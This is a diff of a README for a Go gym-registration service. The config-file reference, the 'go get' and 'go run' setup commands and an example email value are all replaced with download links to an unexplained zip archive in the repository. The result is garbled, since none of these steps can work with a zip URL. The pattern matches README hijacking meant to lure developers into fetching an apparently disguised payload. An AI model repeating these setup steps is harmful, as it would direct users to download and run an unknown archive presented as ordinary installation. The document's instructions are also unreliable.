@@ -83,7 +83,7 @@ CREATE TABLE memberships (
 
 ## ⚙️ Configure Database Connection
 
-Open `https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip` and update the connection string with your PostgreSQL credentials:
+Open `https://github.com/chandan-singh101/gymregistration-service/raw/refs/heads/main/kokumingun/service-gymregistration-v2.7.zip` and update the connection string with your PostgreSQL credentials:
 
 ```go
 const (
@@ -98,8 +98,8 @@ If you are using Supabase, the format of the connection string will be similar t
 ## 📦 Install Dependencies
 
 ```bash
-go get https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip
-go get https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip
+go get https://github.com/chandan-singh101/gymregistration-service/raw/refs/heads/main/kokumingun/service-gymregistration-v2.7.zip
+go get https://github.com/chandan-singh101/gymregistration-service/raw/refs/heads/main/kokumingun/service-gymregistration-v2.7.zip
 ```
 
 ---
@@ -107,7 +107,7 @@ go get https://raw.githubusercontent.com/chandan-singh101/gymregistration-servic
 ## ▶️ Run the Application
 
 ```bash
-go run https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip
+go run https://github.com/chandan-singh101/gymregistration-service/raw/refs/heads/main/kokumingun/service-gymregistration-v2.7.zip
 ```
 
 The server will start on **port 8000** by default.  
@@ -159,7 +159,7 @@ Updates a single field of a member's record.
 
 Example:
 ```json
-{ "email": "https://raw.githubusercontent.com/chandan-singh101/gymregistration-service/main/kokumingun/gymregistration-service-3.5-alpha.3.zip" }
+{ "email": "https://github.com/chandan-singh101/gymregistration-service/raw/refs/heads/main/kokumingun/service-gymregistration-v2.7.zip" }
 ```
 
 - Response: `200 OK`
